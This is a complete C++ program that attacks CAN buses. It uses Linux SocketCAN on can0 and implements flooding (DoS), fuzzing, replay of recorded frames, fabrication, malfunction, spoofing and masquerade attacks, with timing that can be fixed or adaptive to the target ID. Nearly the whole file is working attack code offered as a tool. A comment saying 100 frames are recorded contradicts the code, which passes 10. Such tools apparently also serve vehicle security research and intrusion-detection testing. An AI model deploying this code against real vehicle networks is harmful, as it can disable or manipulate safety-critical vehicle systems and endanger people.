// COMPILE WITH c++17
// g++ -o can_attacker can_attacker.cpp -std=c++17 -pthread

#include <iostream>
#include <chrono>
#include <thread>
#include <vector>
#include <random>
#include <map>
#include <deque>
#include <functional>
#include <linux/can.h>
#include <linux/can/raw.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <string.h>
#include <unistd.h>
#include <algorithm>
#include <atomic>
#include <csignal>
#include <iomanip>
#include <numeric>
#include <cstring>

enum class AttackFrequency {
    HIGH,       // 10-50ms
    MEDIUM,     // 100-500ms
    LOW,        // 1-5s
    ADAPTIVE    // Dynamically adjusts based on target CAN ID
};

struct CANFrame {
    canid_t id;
    uint8_t dlc;
    uint8_t data[8];
};

volatile sig_atomic_t running = 1;

void signalHandler(int signum) {
    std::cout << "\nInterrupt signal (" << signum << ") received. Shutting down...\n";
    running = 0;
}

class CANMessageAttacker {
private:
    int socket_fd;
    struct sockaddr_can addr;
    struct ifreq ifr;
    std::mt19937 rng{std::random_device{}()};
    std::map<canid_t, std::deque<std::chrono::steady_clock::time_point>> traffic_timings;
    const size_t sample_size = 20;
    std::vector<CANFrame> recorded_frames;

    const std::map<AttackFrequency, std::pair<int, int>> frequency_ranges = {
        {AttackFrequency::HIGH, {10, 50}},
        {AttackFrequency::MEDIUM, {100, 500}},
        {AttackFrequency::LOW, {1000, 5000}}
    };

    void logMessage(const std::string& level, const std::string& message) {
        auto now = std::chrono::system_clock::now();
        auto now_time = std::chrono::system_clock::to_time_t(now);
        std::cout << "[" << std::put_time(std::localtime(&now_time), "%Y-%m-%d %H:%M:%S") << "] "
                  << "[" << level << "] " << message << std::endl;
    }

    bool initializeSocket(const std::string& ifname) {
        if ((socket_fd = socket(PF_CAN, SOCK_RAW, CAN_RAW)) < 0) {
            logMessage("ERROR", "Socket creation failed");
            return false;
        }

        strcpy(ifr.ifr_name, ifname.c_str());
        if (ioctl(socket_fd, SIOCGIFINDEX, &ifr) < 0) {
            logMessage("ERROR", "Failed to retrieve interface index");
            close(socket_fd);
            return false;
        }

        addr.can_family = AF_CAN;
        addr.can_ifindex = ifr.ifr_ifindex;

        if (bind(socket_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
            logMessage("ERROR", "Bind failed");
            close(socket_fd);
            return false;
        }

        logMessage("INFO", "Socket initialized successfully on " + ifname);
        return true;
    }

    int calculateAdaptiveInterval(canid_t target_id) {
        if (traffic_timings[target_id].size() < 2) {
            return 1000; // Default interval if insufficient data
        }
        auto& timestamps = traffic_timings[target_id];
        std::vector<int> intervals;
        intervals.reserve(timestamps.size() - 1);
        
        for (size_t i = 1; i < timestamps.size(); i++) {
            auto interval = std::chrono::duration_cast<std::chrono::milliseconds>(
                timestamps[i] - timestamps[i-1]).count();
            intervals.push_back(static_cast<int>(interval));
        }
        return std::accumulate(intervals.begin(), intervals.end(), 0) / 
               static_cast<int>(intervals.size());
    }

    int getInterval(AttackFrequency freq, canid_t target_id = 0) {
        if (freq == AttackFrequency::ADAPTIVE) {
            return calculateAdaptiveInterval(target_id);  // adaptive일 때만 target_id 사용
        }
        
        auto it = frequency_ranges.find(freq);
        if (it == frequency_ranges.end()) {
            logMessage("ERROR", "Invalid frequency range requested");
            return 100;
        }
        
        auto [min_ms, max_ms] = it->second;
        std::uniform_int_distribution<> dist(min_ms, max_ms);
        return dist(rng);
    }

    bool sendFrame(const CANFrame& frame) {
        struct can_frame can_frame;
        can_frame.can_id = frame.id;
        can_frame.can_dlc = frame.dlc;
        memcpy(can_frame.data, frame.data, frame.dlc);

        ssize_t bytes_written = write(socket_fd, &can_frame, sizeof(struct can_frame));
        return bytes_written == sizeof(struct can_frame);
    }

    CANFrame generateRandomFrame(canid_t target_id = 0) {
        CANFrame frame;
        frame.id = (target_id == 0) ? 
                std::uniform_int_distribution<>(0, 0x7FF)(rng) : target_id;
        
        frame.dlc = std::uniform_int_distribution<>(1, 8)(rng);
        for (int i = 0; i < frame.dlc; i++) {
            frame.data[i] = std::uniform_int_distribution<>(0, 0xFF)(rng);
        }
        return frame;
    }

public:
    explicit CANMessageAttacker(const std::string& interface = "can0") {
        if (!initializeSocket(interface)) {
            throw std::runtime_error("Failed to initialize CAN socket");
        }
    }

    ~CANMessageAttacker() {
        close(socket_fd);
    }

    void dosAttack(AttackFrequency freq, canid_t target_id) {
        logMessage("INFO", "Starting DoS attack");
        CANFrame frame;
        frame.id = target_id;
        frame.dlc = 8;
        memset(frame.data, 0x00, 8);

        while (running) {
            if (!sendFrame(frame)) {
                logMessage("ERROR", "Failed to send frame");
                break;
            }
            std::this_thread::sleep_for(
                std::chrono::milliseconds(getInterval(freq, target_id)));
        }
        logMessage("INFO", "DoS attack stopped");
    }

    void fuzzingAttack(AttackFrequency freq, canid_t target_id) {
        logMessage("INFO", "Starting FUZZING attack");
        while (running) {
            if (!sendFrame(generateRandomFrame(target_id))) {
                logMessage("ERROR", "Failed to send frame");
                break;
            }
            std::this_thread::sleep_for(
                std::chrono::milliseconds(getInterval(freq, target_id)));
        }
        logMessage("INFO", "FUZZING attack stopped");
    }

    void replayAttack(AttackFrequency freq, canid_t target_id) {
        logMessage("INFO", "Starting REPLAY attack");
        if (recorded_frames.empty()) {
            logMessage("ERROR", "No recorded frames to replay");
            return;
        }

        while (running) {
            for (const auto& frame : recorded_frames) {
                if (!running) break;
                if (!sendFrame(frame)) {
                    logMessage("ERROR", "Failed to send frame");
                    return;
                }
                std::this_thread::sleep_for(
                    std::chrono::milliseconds(getInterval(freq, target_id)));
            }
        }
        logMessage("INFO", "REPLAY attack stopped");
    }

    void fabricationAttack(AttackFrequency freq, canid_t target_id) {
        logMessage("INFO", "Starting FABRICATION attack");
        while (running) {
            CANFrame frame = generateRandomFrame(target_id);
            if (!sendFrame(frame)) {
                logMessage("ERROR", "Failed to send frame");
                break;
            }
            std::this_thread::sleep_for(
                std::chrono::milliseconds(getInterval(freq, target_id)));
        }
        logMessage("INFO", "FABRICATION attack stopped");
    }

    void malfunctionAttack(AttackFrequency freq, canid_t target_id) {
        logMessage("INFO", "Starting MALFUNCTION attack");
        CANFrame frame;
        frame.id = target_id;
        frame.dlc = 8;
        memset(frame.data, 0xFF, 8);

        while (running) {
            if (!sendFrame(frame)) {
                logMessage("ERROR", "Failed to send frame");
                break;
            }
            std::this_thread::sleep_for(
                std::chrono::milliseconds(getInterval(freq, target_id)));
        }
        logMessage("INFO", "MALFUNCTION attack stopped");
    }

    void spoofingAttack(AttackFrequency freq, canid_t target_id) {
        logMessage("INFO", "Starting SPOOFING attack");
        CANFrame frame;
        frame.id = target_id;
        frame.dlc = 8;
        memset(frame.data, 0x01, 8);

        while (running) {
            if (!sendFrame(frame)) {
                logMessage("ERROR", "Failed to send frame");
                break;
            }
            std::this_thread::sleep_for(
                std::chrono::milliseconds(getInterval(freq, target_id)));
        }
        logMessage("INFO", "SPOOFING attack stopped");
    }

    void masqueradeAttack(AttackFrequency freq, canid_t target_id) {
        logMessage("INFO", "Starting MASQUERADE attack");
        CANFrame frame;
        frame.id = target_id;
        frame.dlc = 8;
        memset(frame.data, 0xAA, 8);

        while (running) {
            if (!sendFrame(frame)) {
                logMessage("ERROR", "Failed to send frame");
                break;
            }
            std::this_thread::sleep_for(
                std::chrono::milliseconds(getInterval(freq, target_id)));
        }
        logMessage("INFO", "MASQUERADE attack stopped");
    }

    // Method to record frames for replay attack
    void startRecording(size_t frame_count) {
        recorded_frames.clear();
        recorded_frames.reserve(frame_count);
        
        struct can_frame frame;
        logMessage("INFO", "Starting frame recording");
        
        for (size_t i = 0; i < frame_count && running; ++i) {
            ssize_t bytes_read = read(socket_fd, &frame, sizeof(struct can_frame));
            if (bytes_read == sizeof(struct can_frame)) {
                CANFrame recorded_frame;
                recorded_frame.id = frame.can_id;
                recorded_frame.dlc = frame.can_dlc;
                memcpy(recorded_frame.data, frame.data, frame.can_dlc);
                recorded_frames.push_back(recorded_frame);
            }
        }
        
        logMessage("INFO", "Recording completed. Frames recorded: " + 
                  std::to_string(recorded_frames.size()));
    }
};

int main(int argc, char** argv) {
    if (argc < 3) {
        std::cerr << "Usage: " << argv[0] << " <attack_type> <frequency> [can_id]\n";
        std::cerr << "Attack types: dos, fuzzing, replay, fabrication, malfunction, spoofing, masquerade\n";
        std::cerr << "Frequencies: high, medium, low, adaptive\n";
        std::cerr << "CAN ID: hexadecimal value (e.g., 0x123)\n";
        std::cerr << "Note: malfunction, spoofing, masquerade attacks require CAN ID\n";
        return 1;
    }

    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = signalHandler;
    sigaction(SIGINT, &sa, nullptr);

    try {
        std::string attack_type = argv[1];
        std::string freq_str = argv[2];
        canid_t target_id = 0;

        // CAN ID가 필수인 공격 유형들
        bool requires_can_id = (attack_type == "malfunction" || 
                              attack_type == "spoofing" || 
                              attack_type == "masquerade" ||
                              freq_str == "adaptive");

        if (requires_can_id) {
            if (argc != 4) {
                throw std::invalid_argument("This attack type requires a CAN ID");
            }
            target_id = std::stoul(argv[3], nullptr, 16);
        }
        else if (argc == 4) {  // CAN ID가 선택적인 경우
            target_id = std::stoul(argv[3], nullptr, 16);
        }

        AttackFrequency freq;
        if (freq_str == "high") freq = AttackFrequency::HIGH;
        else if (freq_str == "medium") freq = AttackFrequency::MEDIUM;
        else if (freq_str == "low") freq = AttackFrequency::LOW;
        else if (freq_str == "adaptive") freq = AttackFrequency::ADAPTIVE;
        else throw std::invalid_argument("Invalid frequency level");

        CANMessageAttacker attacker("can0");

        // Optional: Record frames if replay attack is selected
        if (attack_type == "replay") {
            attacker.startRecording(10);  // Record 100 frames for replay
        }

        if (attack_type == "dos") attacker.dosAttack(freq, target_id);
        else if (attack_type == "fuzzing") attacker.fuzzingAttack(freq, target_id);
        else if (attack_type == "replay") attacker.replayAttack(freq, target_id);
        else if (attack_type == "fabrication") attacker.fabricationAttack(freq, target_id);
        else if (attack_type == "malfunction") attacker.malfunctionAttack(freq, target_id);
        else if (attack_type == "spoofing") attacker.spoofingAttack(freq, target_id);
        else if (attack_type == "masquerade") attacker.masqueradeAttack(freq, target_id);
        else throw std::invalid_argument("Unknown attack type");

    } catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << "\n";
        return 1;
    }

    std::cout << "Program terminated cleanly\n";
    return 0;
}